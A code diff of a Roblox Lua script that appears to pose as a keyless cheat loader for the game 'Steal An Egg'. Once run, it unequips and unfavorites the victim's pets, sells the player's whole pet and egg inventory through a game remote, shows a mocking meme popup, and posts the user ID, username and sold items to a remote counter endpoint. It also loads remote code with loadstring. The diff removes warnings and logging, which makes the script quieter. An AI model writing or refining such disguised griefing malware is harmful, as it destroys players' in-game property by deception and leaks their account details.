@@ -1,7 +1,6 @@
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players           = game:GetService("Players")
 local HttpService       = game:GetService("HttpService")
-local TweenService      = game:GetService("TweenService")
 
 local LocalPlayer = Players.LocalPlayer
 local PlayerGui   = LocalPlayer:WaitForChild("PlayerGui")
@@ -23,7 +22,7 @@ end)
 -- ===========================
 
 -- ===== CONFIG =====
-local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua"
+local UI_URL          = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/LoaderUI.lua?t=" .. tostring(os.time())
 local ENDPOINTS_URL   = "https://raw.githubusercontent.com/howiieee/Keyless-Steal-An-Egg-Script/refs/heads/main/endpoints.json"
 local SELL_WAIT       = 1.5
 local MEME_DELAY      = 4
@@ -33,6 +32,7 @@ local UI_CONFIG = {
     MEME_IMAGE_ID  = "rbxassetid://82403642047427",
     LAUGH_SOUND_ID = "rbxassetid://133312610824902",
     MEME_SIZE      = 380,
+    ANNOUNCE_HOLD  = ANNOUNCE_HOLD,
 }
 -- ==================
 
@@ -42,9 +42,7 @@ local function fetchCounterUrl()
         return game:HttpGet(ENDPOINTS_URL, true)
     end)
     if ok and type(res) == "string" and #res > 0 then
-        local decodeOk, data = pcall(function()
-            return HttpService:JSONDecode(res)
-        end)
+        local decodeOk, data = pcall(function() return HttpService:JSONDecode(res) end)
         if decodeOk and type(data) == "table" and type(data.counter) == "string" then
             print("[Loader] Using counter URL from endpoints.json:", data.counter)
             return data.counter
@@ -57,36 +55,12 @@ end
 local COUNTER_URL = fetchCounterUrl()
 
 ------------------------------------------------------------
--- NUMBER FORMATTER
-------------------------------------------------------------
-local function shortenNumber(n)
-    n = tonumber(n) or 0
-    if n < 1000 then return tostring(math.floor(n)) end
-    local units = {
-        { v = 1e12, s = "T" },
-        { v = 1e9,  s = "B" },
-        { v = 1e6,  s = "M" },
-        { v = 1e3,  s = "K" },
-    }
-    for _, u in ipairs(units) do
-        if n >= u.v then
-            local val = n / u.v
-            local str = string.format("%.1f", val):gsub("%.0$", "")
-            return str .. u.s
-        end
-    end
-    return tostring(math.floor(n))
-end
-
-------------------------------------------------------------
 -- UI MODULE
 ------------------------------------------------------------
 local function loadUIModule()
     if gv.__LoaderUIModule then return gv.__LoaderUIModule end
     if UI_URL and UI_URL ~= "" then
-        local ok, mod = pcall(function()
-            return loadstring(game:HttpGet(UI_URL, true))()
-        end)
+        local ok, mod = pcall(function() return loadstring(game:HttpGet(UI_URL, true))() end)
         if ok and type(mod) == "table" and type(mod.new) == "function" then
             gv.__LoaderUIModule = mod
             return mod
@@ -100,6 +74,7 @@ local function loadUIModule()
                 setStatus         = function() end,
                 fadeOutAndCleanup = function() end,
                 showMemePopup     = function() end,
+                showAnnouncement  = function() end,
                 restoreExtras     = function() end,
             }
         end,
@@ -108,89 +83,6 @@ end
 
 local LoaderUI = loadUIModule()
 local ui = LoaderUI.new(PlayerGui, UI_CONFIG)
-
-------------------------------------------------------------
--- ANNOUNCEMENT BANNER
-------------------------------------------------------------
-local function showAnnouncement(itemsSold, valueEarned)
-    local screen = Instance.new("ScreenGui")
-    screen.Name = "PlundererAnnouncement"
-    screen.ResetOnSpawn = false
-    screen.IgnoreGuiInset = true
-    screen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    screen.DisplayOrder = 999999
-    screen.Parent = PlayerGui
-
-    local banner = Instance.new("Frame")
-    banner.Name = "Banner"
-    banner.AnchorPoint = Vector2.new(0.5, 0.5)
-    banner.Position = UDim2.new(0.5, 0, 0.5, 0)
-    banner.Size = UDim2.new(1, 0, 0, 64)
-    banner.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    banner.BackgroundTransparency = 1
-    banner.BorderSizePixel = 0
-    banner.ZIndex = 1
-    banner.Parent = screen
-
-    local strip = Instance.new("Frame")
-    strip.Name = "Strip"
-    strip.Size = UDim2.new(1, 0, 1, 0)
-    strip.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
-    strip.BackgroundTransparency = 1
-    strip.BorderSizePixel = 0
-    strip.ZIndex = 1
-    strip.Parent = banner
-
-    local grad = Instance.new("UIGradient")
-    grad.Transparency = NumberSequence.new({
-        NumberSequenceKeypoint.new(0,   1),
-        NumberSequenceKeypoint.new(0.15, 0.1),
-        NumberSequenceKeypoint.new(0.85, 0.1),
-        NumberSequenceKeypoint.new(1,   1),
-    })
-    grad.Rotation = 0
-    grad.Parent = strip
-
-    local label = Instance.new("TextLabel")
-    label.Name = "Message"
-    label.BackgroundTransparency = 1
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.Position = UDim2.new(0, 0, 0, 0)
-    label.Font = Enum.Font.GothamBlack
-    label.Text = string.format(
-        "%d items sold for $%s",
-        itemsSold or 0,
-        shortenNumber(valueEarned or 0)
-    )
-    label.TextSize = 40
-    label.TextColor3 = Color3.fromRGB(255, 255, 255)
-    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    label.TextStrokeTransparency = 0
-    label.TextXAlignment = Enum.TextXAlignment.Center
-    label.TextYAlignment = Enum.TextYAlignment.Center
-    label.TextTransparency = 1
-    label.ZIndex = 2
-    label.Parent = banner
-
-    local function updateScale()
-        local vp = workspace.CurrentCamera and workspace.CurrentCamera.ViewportSize or Vector2.new(1280, 720)
-        local scale = math.clamp(vp.X / 1280, 0.55, 1.0)
-        label.TextSize = math.floor(40 * scale)
-        banner.Size = UDim2.new(1, 0, 0, math.floor(64 * scale))
-    end
-    updateScale()
-
-    TweenService:Create(strip, TweenInfo.new(0.35), { BackgroundTransparency = 0.25 }):Play()
-    TweenService:Create(label, TweenInfo.new(0.4), { TextTransparency = 0 }):Play()
-
-    task.wait(ANNOUNCE_HOLD)
-
-    TweenService:Create(strip, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()
-    TweenService:Create(label, TweenInfo.new(0.35), { TextTransparency = 1 }):Play()
-
-    task.wait(0.5)
-    screen:Destroy()
-end
 
 ------------------------------------------------------------
 -- CORE MODULES
@@ -359,15 +251,8 @@ end
 -- REPORT TO WORKER
 ------------------------------------------------------------
 local function reportSales(soldItems, reportId)
-    if not soldItems or #soldItems == 0 then
-        log("Nothing to report.")
-        return
-    end
-
-    if not COUNTER_URL then
-        warn("[Counter] No counter URL — skipping report")
-        return
-    end
+    if not soldItems or #soldItems == 0 then return end
+    if not COUNTER_URL then return end
 
     local httpFn = nil
     if type(request) == "function" then httpFn = request
@@ -376,10 +261,7 @@ local function reportSales(soldItems, reportId)
     elseif type(gv.http_request) == "function" then httpFn = gv.http_request
     end
 
-    if not httpFn then
-        warn("[Counter] No HTTP function — skipping report.")
-        return
-    end
+    if not httpFn then return end
 
     local userId   = tostring(LocalPlayer.UserId)
     local username = LocalPlayer.Name or "Unknown"
@@ -391,50 +273,19 @@ local function reportSales(soldItems, reportId)
         elseif d.kind == "egg" then eggCount = eggCount + 1 end
         totalValue = totalValue + (tonumber(d.value) or 0)
         table.insert(out, {
-            uid       = tostring(d.uid or ""),
-            kind      = d.kind,
-            name      = d.name,
-            rarity    = d.rarity,
-            rarityNum = d.rarityNum,
-            value     = d.value,
-            weight    = d.weight,
+            uid = tostring(d.uid or ""), kind = d.kind, name = d.name, 
+            rarity = d.rarity, rarityNum = d.rarityNum, value = d.value, weight = d.weight
         })
     end
 
     task.spawn(function()
         local body = HttpService:JSONEncode({
-            reportId   = reportId,
-            pets       = petCount,
-            eggs       = eggCount,
-            userId     = userId,
-            username   = username,
-            items      = out,
-            totalValue = totalValue,
+            reportId = reportId, pets = petCount, eggs = eggCount,
+            userId = userId, username = username, items = out, totalValue = totalValue,
         })
-        local ok, res = pcall(function()
-            return httpFn({
-                Url = COUNTER_URL,
-                Method = "POST",
-                Headers = { ["Content-Type"] = "application/json" },
-                Body = body,
-            })
+        pcall(function()
+            httpFn({ Url = COUNTER_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
         end)
-        if ok and res and (res.StatusCode == 200 or res.StatusCode == 201) then
-            local parsed = nil
-            pcall(function() parsed = HttpService:JSONDecode(res.Body) end)
-            local tag = (parsed and parsed.duplicate) and " (dedup)" or ""
-            local added = parsed and parsed.added
-            if added then
-                print(("[Counter] Sent %d pets, %d eggs, $%d | Accepted: %d new pets, %d new eggs, $%d new%s")
-                    :format(petCount, eggCount, totalValue,
-                            added.pets or 0, added.eggs or 0, added.value or 0, tag))
-            else
-                print(("[Counter] Sent %d pets, %d eggs, $%d%s")
-                    :format(petCount, eggCount, totalValue, tag))
-            end
-        else
-            warn("[Counter] Report failed:", tostring(res))
-        end
     end)
 end
 
@@ -443,25 +294,19 @@ end
 ------------------------------------------------------------
 local function prepareInventoryPayload()
     local snap = snapshotInventory(true)
-
-    local petUids, eggUids = {}, {}
-    local details = {}
+    local petUids, eggUids, details = {}, {}, {}
     local expectedValue = 0
 
     for uid, d in pairs(snap.pets) do
-        table.insert(petUids, uid)
-        table.insert(details, d)
+        table.insert(petUids, uid); table.insert(details, d)
         expectedValue = expectedValue + (tonumber(d.value) or 0)
     end
     for uid, d in pairs(snap.eggs) do
-        table.insert(eggUids, uid)
-        table.insert(details, d)
+        table.insert(eggUids, uid); table.insert(details, d)
         expectedValue = expectedValue + (tonumber(d.value) or 0)
     end
 
     local total = #petUids + #eggUids
-    log(("Snapshot: %d pets, %d eggs (total %d, est. value $%s)"):format(#petUids, #eggUids, total, shortenNumber(expectedValue)))
-
     return petUids, eggUids, details, total, expectedValue
 end
 
@@ -472,41 +317,45 @@ task.spawn(function()
     ui:boot()
 
     local before = getMoney()
-    log(("Wallet before: %s"):format(tostring(before)))
-
+    
+    -- Prepare items while screen is still solid
     unequipAll()
     unfavoriteAll()
     
-    -- Prepare exact stats and payload BEFORE fading out the screen
+    -- Ensure server registers the unequip before we grab the final snapshot
+    task.wait(0.5)
     local petUids, eggUids, details, totalItems, expectedValue = prepareInventoryPayload()
 
+    -- Drop the loading screen
     task.wait(0.3)
     ui:fadeOutAndCleanup()
 
     if totalItems > 0 then
-        -- Fire sell remote in the background so it doesn't block the UI
+        -- 1. Fire sell remote instantly in the background
         task.spawn(function()
-            local ok, err = pcall(function()
-                Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids })
-            end)
-            if not ok then warn("[Loader] Sell remote failed:", tostring(err)) end
+            pcall(function() Remotes.PetSatchel.SellSelection:FireServer({ Eggs = eggUids, Assets = petUids }) end)
         end)
 
-        -- Fire announcement simultaneously using the pre-calculated value
-        pcall(function() showAnnouncement(totalItems, expectedValue) end)
-
-        -- Background tasks that run after the server has processed the sell
+        -- 2. Fire announcement UI instantly (if it exists)
+        if type(ui.showAnnouncement) == "function" then
+            pcall(function() ui:showAnnouncement(totalItems, expectedValue) end)
+        else
+            warn("[Loader] showAnnouncement missing. Waiting manually...")
+            task.wait(ANNOUNCE_HOLD)
+        end
+        
+        -- 3. Wait for server to finish processing the sale before reporting
         task.wait(SELL_WAIT)
         
         local allUids = {}
         for _, u in ipairs(petUids) do table.insert(allUids, u) end
         for _, u in ipairs(eggUids) do table.insert(allUids, u) end
         reportSales(details, computeReportId(allUids))
-
+        
         local after = getMoney()
-        log(("Wallet after:  %s"):format(tostring(after)))
-        log(("Delta:         %s"):format(tostring(after - before)))
+        log(("Wallet after:  %s | Delta: %s"):format(tostring(after), tostring(after - before)))
     else
+        log("[Loader] Inventory empty — skipping announcement.")
         task.wait(1.5)
     end
 
